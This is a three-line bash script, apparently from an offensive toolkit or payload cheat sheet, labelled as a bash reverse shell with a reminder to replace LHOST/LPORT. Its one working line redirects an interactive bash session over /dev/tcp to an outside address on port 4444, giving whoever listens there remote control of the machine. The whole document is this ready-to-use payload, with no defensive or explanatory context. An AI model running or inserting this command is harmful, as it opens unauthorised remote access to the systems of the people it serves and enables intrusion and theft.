#!/bin/bash
# reverse shell — bash. Replace LHOST/LPORT.
bash -i >& /dev/tcp/10.25.55.205/4444 0>&1
